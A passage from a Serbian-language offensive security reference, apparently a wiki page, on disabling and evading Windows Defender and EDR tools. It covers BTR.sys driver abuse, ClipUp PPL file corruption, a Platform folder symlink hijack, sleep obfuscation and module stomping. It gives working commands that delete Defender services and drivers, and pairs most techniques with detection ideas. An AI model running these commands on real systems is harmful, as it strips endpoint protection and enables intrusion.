Defender obično ispušta resurs kao datoteku nasumičnog naziva `[a-z]{8}.sys` i registruje kernel servis sličnog naziva. `DriverEntry` čita vrednost `Args` servisa, otvara navedeni NTFS ADS, dešifruje i proverava listu radnji, upisuje povratne informacije i vraća `0xC0000056` (`STATUS_DELETE_PENDING`) nakon uspešnog izvršavanja, tako da se drajver učitava iz memorije umesto da ostane rezidentan. Falsifikovani servis ima sledeće karakteristične vrednosti.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Tok `:changelist` sadrži jedan RC4-šifrovan blob. Analizirane verzije ponovo koriste fiksni ključ od 256 bajtova, tako da šifrovanje nije granica autorizacije. Ispravan plaintext ima globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i ID transakcije izveden iz payloada), iza kog slede putanja za povratne informacije, završena nul-terminatorom UTF-16, i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i podatke specifične za tu akciju, koji se završavaju sa **tačno četiri NUL bajta**. Svako zaglavlje i svaki region podataka zasebno se proveravaju pomoću CRC-32 polinoma `0xEDB88320`, početnog stanja `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija otkrivaju ove primitive kernela.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Brisanje datoteke, uključujući zaključanu datoteku |
| 2 | `[UTF-16 path]` | Uklanjanje praznog direktorijuma |
| 3 | `[Flags][source][destination]` | Premeštanje datoteke na zaštićenu putanju koju je izabrao napadač; prazno odredište znači brisanje |
| 4 | `[Flags][key path]` | Rekurzivno brisanje registry ključa |
| 5 | `[Flags][key path + "\\" + value]` | Brisanje registry vrednosti |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Kreiranje/ažuriranje registry vrednosti i kreiranje nedostajućih putanja ključeva |

Za akcije 5 i 6, separator ključa/vrednosti na žici su **dve uzastopne obrnute kose crte**; putanja formatirana na uobičajen način neće biti ispravno razdvojena. Datoteka povratnih informacija uglavnom preslikava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultat `NTSTATUS`. Za akcije 1 i 2, koje nemaju početno polje zastavica, BTR pomera putanju u četiri rezervisana završna bajta kako bi napravio prostor za taj status.<sup>[[36]](#references)</sup>

### Tok rada `BTR_CLI` i vremenski prozor ranog pokretanja

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementira ceo lanac: izdvaja `BTR.sys` iz lokalnog Defendera, kreira `<random>.sys:changelist` i tok povratnih informacija, serijalizuje, izračunava kontrolne sume i šifruje ulančane akcije, direktno kreira service registry ključ, a zatim poziva `NtLoadDriver` za `-trigger now` ili ostavlja drajver kao system-start drajver za `-trigger boot`. Direktno postavljanje u registry zaobilazi uobičajeni SCM put `CreateServiceW` i zato **ne** generiše događaj instalacije servisa ID 7045. Artefakti pokrenuti pri podizanju sistema mogu se kasnije ukloniti pomoću `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nije upotrebljiv jer BTR obavlja file I/O iz `DriverEntry` pre nego što storage stack i `SystemRoot` link budu spremni. `Start=1` uz grupu visokog prioriteta `Boot Bus Extender` umesto toga izvršava se u Phase 1: NTFS je upotrebljiv, ali se mnogi security driver-i koji se pokreću pri startovanju sistema i EDR servisi u user-mode-u još nisu inicijalizovali. Filteri koji se pokreću pri startovanju sistema, kao što je `WdFilter`, možda su već učitani, ali BTR može da ukloni njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja i može da obriše izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz jer se BTR pokreće nakon procene boot-start komponenti i ima važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više akcija se izvršava u jednoj transakciji. PoC dodaje Action 1 na početak za hardkodirani `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim obrađuje sopstveni zahtev za brisanje i uklanja ga pre nego što se isključi. Time se smanjuju tragovi, a smeštanje povratnih informacija u `<random>.sys:<random>.dat` omogućava uklanjanje driver-a i oba stream-a zajedno.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije za detekciju sa visokim signalom

Pravila zasnovana samo na potpisu i Microsoft-ova lista blokiranih ranjivih driver-a ne rešavaju zloupotrebu predviđene funkcionalnosti BTR-a. Dajte prednost sledećim korelacijama ponašanja, uz razlikovanje legitimnog Defender porekla od proizvoljnog pokretača.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Kreiranje `.sys:changelist` je univerzalno za BTR staging. ADS `.dat` prikačen na isti `.sys` posebno je sumnjiv, jer legitimni Defender obično smešta povratne informacije u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** Koreliši direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender`, a nema odgovarajući događaj instalacije SCM-a.
- **Sysmon 6 -> 23:** Koreliši učitavanje poznatog BTR driver-a koji nije pokrenut iz Defender-a sa naknadnim brisanjem datoteka koje se pripisuje procesu `System`/PID 4, naročito ako se radi o security binarnim datotekama.
- **Sysmon 11 -> 23:** Upozori na brzo kreiranje i brisanje datoteke `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograniči i evidentiraj dodelu/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan razlog za poverenje kada se driver security alata priprema pomoću `cmd.exe`, PowerShell-a ili nepoznatog procesa.

## Zloupotreba Protected Process Light (PPL) za menjanje AV/EDR-a pomoću LOLBIN-ova

Protected Process Light (PPL) primenjuje hijerarhiju potpisnika/nivoa, tako da samo zaštićeni procesi istog ili višeg nivoa mogu da menjaju jedni druge. Iz ofanzivnog ugla, ako možete legitimno da pokrenete binarnu datoteku sa omogućenim PPL-om i kontrolišete njene argumente, možete da pretvorite benignu funkcionalnost (npr. logovanje) u ograničenu write primitivu zaštićenu PPL-om, koja može da piše u zaštićene direktorijume koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta je potrebno da bi se proces pokrenuo kao PPL
- Ciljni EXE (i svi učitani DLL-ovi) moraju biti potpisani EKU-om koji podržava PPL.
- Proces se mora kreirati pomoću CreateProcess sa zastavicama: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan nivo zaštite koji odgovara potpisniku binarne datoteke (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za potpisnike anti-malware softvera, `PROTECTION_LEVEL_WINDOWS` za Windows potpisnike). Pogrešan nivo dovešće do neuspešnog kreiranja.

Širi uvod u PP/PPL i zaštitu LSASS-a potražite ovde:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Pomoćni alat otvorenog koda: CreateProcessAsPPL (bira nivo zaštite i prosleđuje argumente ciljnom EXE-u):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac korišćenja:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitiv: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` sam pokreće novi proces i prihvata parametar za upisivanje log fajla na putanju koju zada pozivalac.
- Kada se pokrene kao PPL proces, upisivanje fajla obavlja se uz PPL zaštitu.
- ClipUp ne može da obradi putanje koje sadrže razmake; koristite kratke putanje 8.3 za pristup uobičajeno zaštićenim lokacijama.

Pomoćne alatke za kratke putanje 8.3
- Prikažite kratka imena: pokrenite `dir /x` u svakom nadređenom direktorijumu.
- Izvedite kratku putanju u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite LOLBIN koji podržava PPL (ClipUp) sa `CREATE_PROTECTED_PROCESS`, koristeći pokretač (npr. CreateProcessAsPPL).
2) Prosledite argument za putanju ClipUp log fajla da biste prinudno kreirali fajl u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite kratka imena 8.3.
3) Ako AV obično drži ciljnu binarnu datoteku otvorenom/zaključanom dok radi (npr. MsMpEng.exe), zakažite upisivanje prilikom pokretanja sistema, pre nego što se AV pokrene, tako što ćete instalirati uslugu sa automatskim pokretanjem koja se pouzdano pokreće ranije. Proverite redosled pokretanja pomoću Process Monitor-a (boot logging).
4) Pri ponovnom pokretanju, upisivanje uz PPL zaštitu obavlja se pre nego što AV zaključa svoje binarne datoteke, čime se oštećuje ciljna datoteka i sprečava pokretanje.

Primer poziva (putanje su izostavljene/skraćene radi bezbednosti):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Napomene i ograničenja
- Ne možete da kontrolišete sadržaj koji ClipUp upisuje, već samo mesto upisa; ova mogućnost je pogodna za korupciju, a ne za precizno ubacivanje sadržaja.
- Potrebna su lokalna administratorska/SYSTEM ovlašćenja za instaliranje/pokretanje servisa i period tokom kog je moguće ponovo pokrenuti sistem.
- Tajming je presudan: ciljna datoteka ne sme biti otvorena; izvršavanje pri pokretanju sistema izbegava zaključavanje datoteke.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito ako ga pokreću nestandardni pokretači, u vreme pokretanja sistema.
- Novi servisi podešeni da automatski pokreću sumnjive binarne datoteke i koji se dosledno pokreću pre Defender-a/AV-a. Istražite kreiranje/izmenu servisa pre neuspeha pri pokretanju Defender-a.
- Nadzor integriteta datoteka za binarne datoteke/fascikle Platform programa Defender; neočekivano kreiranje/izmena datoteka od strane procesa sa zastavicama za zaštićene procese.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i neuobičajenu upotrebu PPL nivoa od strane binarnih datoteka koje nisu AV.

Ublažavanje
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke smeju da se pokreću kao PPL i pod kojim nadređenim procesima; blokirajte pokretanje ClipUp-a izvan legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu servisa koji se automatski pokreću i nadgledajte manipulaciju redosledom pokretanja.
- Uverite se da su zaštita od neovlašćenih izmena programa Defender i zaštita pri ranom pokretanju omogućene; istražite greške pri pokretanju koje ukazuju na korupciju binarnih datoteka.
- Razmotrite onemogućavanje generisanja kratkih imena u formatu 8.3 na jedinicama na kojima se nalaze bezbednosni alati, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Menjanje Microsoft Defender-a putem symlink hijack-a fascikle verzije Platform

Windows Defender bira platformu sa koje se pokreće tako što nabraja podfascikle u:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfasciklu sa leksikografski najvećim nizom verzije (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese servisa Defender-a (uz ažuriranje putanja servisa/registra u skladu s tim). Ovaj izbor veruje stavkama direktorijuma, uključujući tačke za ponovnu analizu direktorijuma (symlink-ove). Administrator to može da iskoristi za preusmeravanje Defender-a ka putanji u koju napadač može da upisuje i da postigne DLL sideloading ili prekid rada servisa.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalni Administrator (potrebno za kreiranje direktorijuma/symlink-ova u fascikli Platform)
- Mogućnost ponovnog pokretanja sistema ili pokretanja ponovnog izbora platforme Defender-a (ponovno pokretanje servisa pri pokretanju sistema)
- Potrebni su samo ugrađeni alati (mklink)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene fascikle, ali izbor platforme veruje stavkama direktorijuma i bira leksikografski najveću verziju bez provere da li se cilj razrešava u zaštićenu/poverljivu putanju.

Korak po korak (primer)
1) Pripremite kopiju trenutne fascikle platforme u koju može da se upisuje, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte direktorijumski symlink više verzije unutar direktorijuma Platform koji pokazuje na vašu fasciklu:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da primetite novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registar koji odražavaju tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/code execution: Ostavite/zamenite DLL-ove koje Defender učitava iz direktorijuma svoje aplikacije da biste izvršili kod u Defender procesima. Pogledajte odeljak iznad: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Zaustavljanje servisa/uskraćivanje usluge: Uklonite version-symlink da se konfigurisana putanja ne bi razrešila pri sledećem pokretanju, zbog čega Defender neće uspeti da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; potrebna su administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing sa PIC (u stilu Crystal Kit-a)

Red timovi mogu da prebace runtime evasion iz C2 implanta u sam ciljni modul tako što će zakačiti njegovu Import Address Table (IAT) i preusmeriti odabrane API-je kroz poziciono nezavisan kod (PIC) pod kontrolom napadača. Time se evasion proširuje izvan malog skupa API-ja koje mnogi kit-ovi izlažu (npr. CreateProcessA), a iste zaštite se primenjuju i na BOF-ove i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Pripremite PIC blob uz ciljni modul pomoću reflective loader-a (dodat ispred ili kao prateći fajl). PIC mora biti samostalan i poziciono nezavisan.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i zakrpite IAT unose za ciljane importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC omotače.
- Svaki PIC omotač izvršava evasion tehnike pre tail-call-a ka adresi stvarnog API-ja. Tipične evasion tehnike uključuju:
  - Maskiranje/demaskiranje memorije oko poziva (npr. šifrovanje beacon oblasti, RWX→RX, promena naziva/dozvola stranica), pa vraćanje u prethodno stanje nakon poziva.
  - Call-Stack Spoofing: napravite benigni stek i pređite na ciljni API tako da analiza call stack-a utvrdi očekivane frejmove.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izvezite interfejs kako bi Aggressor skripta (ili ekvivalent) mogla da registruje API-je koje treba zakačiti za Beacon, BOF-ove i post-ex DLL-ove.

Zašto ovde koristiti IAT hooking
- Radi sa svakim kodom koji koristi zakačeni import, bez izmene koda alata i bez oslanjanja na Beacon za posredovanje u pozivima određenih API-ja.
- Obuhvata post-ex DLL-ove: zakačivanje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/izbegavanja analize steka na njihove API pozive.
- Vraća pouzdano korišćenje post-ex komandi koje pokreću procese uprkos detekcijama zasnovanim na call stack-u, omotavanjem CreateProcessA/W.

Minimalna skica IAT hook-a (x64 C/C++ pseudokod)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR, a pre prve upotrebe importa. Reflective loader-i poput TitanLdr/AceLdr pokazuju kako se hooking obavlja tokom DllMain učitavanja modula.
- Wrapper-i neka budu što manji i PIC-safe; pravu API funkciju pronađi pomoću originalne IAT vrednosti koju si sačuvao pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX prelaze za PIC i izbegavaj stranice koje su istovremeno writable i executable.

Call-stack spoofing stub
- PIC stub-ovi u Draugr stilu prave lažni call chain (povratne adrese u benignim modulima), a zatim preusmeravaju izvršavanje na pravu API funkciju.
- Time se zaobilaze detekcije koje očekuju kanonske stack-ove od Beacon/BOFs poziva ka osetljivim API funkcijama.
- Kombinuj ih sa tehnikama stack cutting/stack stitching da bi se izvršavanje smestilo u očekivane frame-ove pre prologa API funkcije.

Operativna integracija
- Dodaj reflective loader ispred post-ex DLL-ova kako bi se PIC i hooks automatski inicijalizovali prilikom učitavanja DLL-a.
- Koristi Aggressor skriptu za registraciju ciljnih API funkcija kako bi Beacon i BOFs transparentno koristili isti evasion put bez izmena koda.

Razmatranja za detekciju/DFIR
- IAT integritet: unosi koji vode do adresa koje nisu deo image-a (heap/anon); periodična provera import pointer-a.
- Anomalije stack-a: povratne adrese koje ne pripadaju učitanim image-ovima; nagli prelazi na non-image PIC; nedosledno poreklo RtlUserThreadStart.
- Loader telemetrija: upisivanja u IAT unutar procesa, rana DllMain aktivnost koja menja import thunk-ove, neočekivani RX region-i napravljeni tokom učitavanja.
- Zaobilaženje image-load detekcije: ako hook-uješ LoadLibrary*, prati sumnjiva učitavanja automation/clr assembly-ja povezana sa događajima maskiranja memorije.

Povezani elementi i primeri
- Reflective loader-i koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub-ovi (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks preko rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš da hook-uješ importe **tokom** `ProcessImports()` tako što ćeš pokazivač loader-a na `GetProcAddress` zameniti prilagođenim resolver-om koji prvo proverava hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **resident PICO** (persistent PIC object) koji opstaje nakon što se privremeni loader PIC oslobodi.
- Izvezi funkciju `setup_hooks()` koja prepisuje import resolver loader-a (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U funkciji `_GetProcAddress` preskoči ordinal importe i koristi hash-based hook lookup kao što je `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom pozovi pravi `GetProcAddress`.
- Registruj ciljne hooks tokom linkovanja pomoću Crystal Palace unosa `addhook "MODULE$Func" "hook"`. Hook ostaje važeći jer se nalazi unutar rezidentnog PICO-a.

Time se dobija **import-time IAT redirection** bez patchovanja code section-a učitanog DLL-a nakon učitavanja.

### Forsiranje hookable importa kada cilj koristi PEB-walking

Import-time hooks se aktiviraju samo ako se funkcija zaista nalazi u IAT-u cilja. Ako modul razrešava API funkcije pomoću PEB-walk + hash (bez import unosa), forsiraj pravi import kako bi loader-ov put `ProcessImports()` obradio tu funkciju:

- Zameni razrešavanje hashed export-a (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom kao što je `&WaitForSingleObject`.
- Kompajler će emitovati IAT unos, čime se omogućava presretanje prilikom razrešavanja importa u reflective loader-u.

### Ekko-style sleep/idle obfuscation bez patchovanja `Sleep()`

Umesto patchovanja `Sleep`, hook-uj **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja obuhvati poziv Ekko-style obfuscation chain-om koji šifruje image u memoriji tokom idle perioda:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` da zakažeš niz callback-ova koji pozivaju `NtContinue` sa pripremljenim `CONTEXT` frame-ovima.
- Uobičajen chain (x64): postavi image na `PAGE_READWRITE` → šifruj RC4 algoritmom pomoću `advapi32!SystemFunction032` ceo mapirani image → izvrši blokirajuće čekanje → dešifruj RC4 algoritmom → **vrati dozvole za svaki section** prolaskom kroz PE section-e → signaliziraj završetak.
- `RtlCaptureContext` obezbeđuje šablon `CONTEXT`; kloniraj ga u više frame-ova i podesi registre (`Rip/Rcx/Rdx/R8/R9`) da pozovu svaki korak.

Operativni detalj: za duga čekanja vrati „success“ (npr. `WAIT_OBJECT_0`) kako bi pozivalac nastavio dok je image maskiran. Ovaj obrazac skriva modul od scanner-a tokom idle perioda i izbegava prepoznatljivi potpis klasičnog „patchovanog `Sleep()`“.

Ideje za detekciju (zasnovane na telemetriji)
- Nizovi callback-ova funkcije `CreateTimerQueueTimer` koji pokazuju na `NtContinue`.
- Upotreba `advapi32!SystemFunction032` nad velikim, kontinuiranim baferima veličine image-a.
- `VirtualProtect` nad velikim opsegom, praćen vraćanjem dozvola za svaki section.

### Runtime CFG registracija za sleep-obfuscation gadget-e

Na CFG-enabled ciljevima, prvi indirect jump ka mid-function gadget-u kao što su `jmp [rbx]` ili `jmp rdi` obično će srušiti proces sa greškom `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije prisutan u CFG metadata modula. Da bi Ekko/Kraken-style chain-ovi funkcionisali u očvršćenim procesima:<sup>[[30]](#references)</sup>

- Registruj svako indirect odredište koje chain koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i unosa `CFG_CALL_TARGET_VALID`.
- Za adrese unutar učitanih image-ova (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počinje na **image base** adresi i da obuhvati **celu veličinu image-a**.
- Za manually mapped/PIC/stomped regione, umesto toga koristi **allocation base** adresu i veličinu alokacije.
- Označi ne samo dispatch gadget već i indirektno dosegnute export-e (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall-ove), kao i sve izvršne sekcije pod kontrolom napadača koje će postati indirect ciljevi.

Time se ROP/JOP-style sleep chain-ovi pretvaraju iz primitiva koja „radi samo u procesima bez CFG-a“ u ponovo upotrebljivu primitivu za `explorer.exe`, browser-e, `svchost.exe` i druge endpoint-e kompajlirane sa `/guard:cf`.

### CET-safe stack spoofing za uspavane thread-ove

Potpuna zamena `CONTEXT`-a je uočljiva i može da zakaže na CET Shadow Stack sistemima jer spoof-ovani `Rip` i dalje mora da odgovara hardverskom shadow stack-u. Bezbedniji obrazac za maskiranje tokom spavanja je:<sup>[[30]](#references)</sup>

- Izaberi drugi thread u istom procesu i pročitaj njegove granice stack-a u `NT_TIB` / TEB-u (`StackBase`, `StackLimit`) preko `NtQueryInformationThread`.
- Napravi rezervnu kopiju stvarnog TEB/TIB-a trenutnog thread-a.
- Sačuvaj stvarni kontekst thread-a koji spava pomoću `GetThreadContext`.
- Kopiraj **samo** stvarni `Rip` u spoof kontekst, a spoof-ovani `Rsp`/stanje stack-a ostavi nepromenjenim.
- Tokom perioda spavanja kopiraj `NT_TIB` spoof thread-a u TEB trenutnog thread-a kako bi stack walker-i razmotavali stack unutar legitimnog opsega.
- Kada se čekanje završi, vrati originalni TIB i kontekst thread-a.

Tako се zadržava CET-usaglašen instruction pointer, a EDR stack walker-i koji se oslanjaju na TEB stack metadata da bi proverili razmotavanje stack-a bivaju navedeni na pogrešan trag.

### Alternativa zasnovana na APC-ovima: Kraken Mask

Ako je timer-queue dispatch previše prepoznatljiv, isti sleep-encrypt-spoof-restore niz može da se izvrši iz suspendovanog pomoćnog thread-a pomoću queued APC-ova:<sup>[[27]](#references)</sup>

- Kreiraj pomoćni thread sa `NtTestAlert` kao entrypoint-om.
- Stavi pripremljene `CONTEXT` frame-ove/APC-ove u red pomoću `NtQueueApcThread` i obradi ih pomoću `NtAlertResumeThread`.
- Sačuvaj stanje chain-a na heap-u, a ne na stack-u pomoćnog thread-a, da bi se izbeglo iscrpljivanje podrazumevanog stack-a od 64 KB.
- Koristi `NtSignalAndWaitForSingleObject` da atomski signaliziraš start event i blokiraš thread.
- Suspenduj glavni thread pre vraćanja TIB/context-a (`NtSuspendThread` → restore → `NtResumeThread`) da bi se smanjio vremenski interval u kom scanner može da zatekne delimično vraćen stack.

Time se potpis `CreateTimerQueueTimer` + `NtContinue` zamenjuje potpisom pomoćnog thread-a/APC-a, uz zadržavanje istih ciljeva RC4 maskiranja i stack spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre spavanja, čekanja ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` oko poziva `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread`, praćen direktnim upisima u granice stack-a trenutnog thread-a u TEB/TIB-u.
- `NtQueueApcThread`/`NtAlertResumeThread` chain-ovi koji indirektno dosežu `SystemFunction032`, `VirtualProtect` ili pomoćne funkcije za vraćanje dozvola section-a.
- Ponovljena upotreba kratkih gadget potpisa kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivot-a unutar potpisanih modula.


## Precision Module Stomping

Module stomping izvršava payload iz **`.text` section-a DLL-a koji je već mapiran unutar ciljnog procesa**, umesto da alocira očiglednu privatnu izvršnu memoriju ili učita novi žrtveni DLL. Cilj prepisivanja treba da bude **učitan image sa diska** čiji code prostor može da primi payload bez oštećenja putanja koda koje su procesu i dalje potrebne.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor cilja

Naivno stomping-ovanje uobičajenih modula kao što su `uxtheme.dll` ili `comctl32.dll` nije pouzdano: DLL možda nije učitan u udaljenom procesu, a premali code region će srušiti proces. Pouzdaniji postupak:

1. Nabroj module ciljnog procesa i zadrži **imena-only include list** DLL-ova koji su već učitani.
2. Najpre napravi payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Skeniraj DLL-ove kandidate na disku i uporedi PE section **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine fajla jer odražava veličinu izvršnog section-a **nakon mapiranja u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA izvezene funkcije kao početni offset za stomp.
5. Izračunaj **blast radius**: ako payload premaši granicu izabrane funkcije, prepisivaće susedne export-e koji su posle nje raspoređeni u memoriji.

Tipični recon/selection helper-i koji se sreću u praksi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operativne napomene
- Dajte prednost DLL-ovima koji su **već učitani** u udaljenom procesu da biste izbegli telemetriju funkcije `LoadLibrary` i neočekivana učitavanja image-a.
- Dajte prednost exportima koje ciljna aplikacija retko izvršava; u suprotnom, uobičajeni tokovi izvršavanja mogu naići na izmenjene bajtove pre ili posle kreiranja niti.
- Kod velikih implantata često je potrebno promeniti ugrađivanje shellcode-a sa string literala na **inicijalizator niza bajtova/u vitičastim zagradama**, kako bi ceo bafer bio pravilno predstavljen u izvornom kodu injectora.

Ideje za detekciju
- Udaljeni upisi u izvršne stranice koje podržava image (`MEM_IMAGE`, `PAGE_EXECUTE*`), umesto u uobičajenije privatne RWX/RX alokacije.
- Ulazne tačke exporta čiji se bajtovi u memoriji više ne podudaraju sa odgovarajućim fajlom na disku.
- Udaljene niti ili promene konteksta koje započinju izvršavanje unutar legitimnog DLL exporta čiji su početni bajtovi nedavno izmenjeni.
- Sumnjivi nizovi poziva `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje niti.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **ubacivanja u proces / izbegavanja EDR-a** koja zaobilazi klasičan put udaljenog upisa (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenut ciljni proces, zloupotrebljava činjenicu da Windows **kopira odabrane početne parametre funkcije `CreateProcessW` u child proces** i čuva ih u `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nosioci podataka koji se mogu otrovati i koje kopira `CreateProcessW`

Korisni nosioci podataka su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (uz `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
